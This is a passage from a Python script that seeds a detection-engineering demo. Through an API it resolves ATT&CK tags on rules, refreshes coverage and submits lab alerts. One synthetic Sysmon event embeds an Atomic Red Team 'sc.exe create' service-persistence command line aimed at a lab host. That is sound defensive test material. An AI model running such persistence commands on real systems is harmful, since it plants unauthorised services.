    for key in ("sam_rerun", "cron_rerun"):
        review("bob", m["runs"][key])


def resolve(c: httpx.Client, signature_uuid: str, technique: str, body: dict):
    # a resolution waits on the coverage refresh lock; a 409 right after another write is worth a retry
    for _ in range(5):
        r = c.put(f"/api/v2/svs/worklist/{signature_uuid}/{technique}/resolution", json=body)
        if r.status_code != 409:
            return ok(r)
        time.sleep(3)
    return ok(r)


def phase_coverage(m: dict):
    subprocess.run([sys.executable, str(SAQ_HOME / "ace"), "svs", "coverage", "refresh", "--force"], check=True,
                   cwd=SAQ_HOME, capture_output=True)
    with client("dana") as c:
        rows = ok(c.get("/api/v2/svs/worklist/", params={"limit": 200}))["data"]
    ours = {(r["signature_uuid"], r["technique"]): r for r in rows if r["signature_uuid"] in UUID.values()}
    log(f"worklist rows for the training rules: {[(k[1], v['status']) for k, v in ours.items()]}")
    # SAM's T1552.002 tag stays open: the worklist's "Needs decision"
    with client("alice") as c:
        if (UUID["netuser"], "T1078.003") in ours:
            resolve(c, UUID["netuser"], "T1078.003", {
                "resolution": "keep", "reason": "The account the rule catches is the one an attacker logs on with "
                                                "next; no ART test goes on to use it, so nothing will confirm this."})
        if (UUID["netuser"], "T1098") in ours:
            resolve(c, UUID["netuser"], "T1098", {
                "resolution": "remove", "reason": "Creating an account is not account manipulation; the tag was a "
                                                  "copy-paste from the group-membership rule.",
                "reference": f"{PR_BASE}/421"})
    subprocess.run([sys.executable, str(SAQ_HOME / "ace"), "svs", "coverage", "snapshot", "--force"], check=True,
                   cwd=SAQ_HOME, capture_output=True)


def phase_live(m: dict):
    """Last, so it is still running when the screenshots are taken: an hour-long observation window."""
    with client("alice") as c:
        ok(c.put(f"/api/v2/svs/tests/{TESTS['service']}/settings", json={"observation_minutes": 60}))
    run = register("service", "win10-art-02", ticket="LAB-1057")
    launcher_call(run["run_id"], "start")
    time.sleep(2)
    m["alerts"]["service"] = submit(
        "Sysmon: sc.exe created a service on win10-art-02", "win10-art-02",
        {"sysmon-1-sc-create.json": sysmon_event(
            "win10-art-02", "LAB\\svc_art", "C:\\Windows\\System32\\sc.exe",
            f'sc.exe create AtomicTestService_{run["marker"]} binPath= "C:\\AtomicRedTeam\\atomics\\T1543.003\\bin\\'
            'AtomicService.exe" start=auto  type=Own', "C:\\Windows\\System32\\cmd.exe")}, user="svc_art")
    m["runs"]["service_live"] = run["run_id"]
    wait_alert(m["alerts"]["service"])



def samples(m: dict):
    with client("dana") as c:
        rows = ok(c.get("/api/v2/svs/samples/", params={"limit": 200}))["data"]
    m["samples"] = [{"sha256": r["sha256"], "rule_uuid": r["rule_uuid"], "label": r.get("label"),
                     "file": Path(r["file_path"]).name, "rule": r["rule_name"]}
                    for r in rows if r["rule_uuid"] in UUID.values()]


def seed(args):
    ace_environment()
    ensure_personas()
    ensure_hosts()
    m = json.loads(MANIFEST_PATH.read_text()) if MANIFEST_PATH.exists() and args.resume else {"runs": {}, "alerts": {}}
    m.update({"batch": BATCH, "hosts": list(HOSTS), "tests": TESTS, "rules": UUID, "password": GUI_PASSWORD})
    for name, phase in (("one", phase_one), ("one_review", phase_one_review), ("samples", phase_samples), ("two", phase_two),
                        ("validations", phase_validations), ("coverage", phase_coverage), ("live", phase_live),
                        ("history", phase_history)):
        if name in m.get("done", []):
            continue
        log(f"phase {name}")
        phase(m)
        m.setdefault("done", []).append(name)
        MANIFEST_PATH.write_text(json.dumps(m, indent=1))
    samples(m)
    MANIFEST_PATH.write_text(json.dumps(m, indent=1))
    log(f"done; manifest at {MANIFEST_PATH}")


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = parser.add_subparsers(required=True)
    sub.add_parser("setup", help="create the training rule repository and print the config overlay").set_defaults(func=setup)
    p = sub.add_parser("seed", help="drive the demo scenario through the API")
    p.add_argument("--resume", action="store_true", help="skip the phases the manifest says are done")
    p.set_defaults(func=seed)
    args = parser.parse_args()
    TRAINING_DIR.mkdir(parents=True, exist_ok=True)
    args.func(args)


if __name__ == "__main__":
    main()
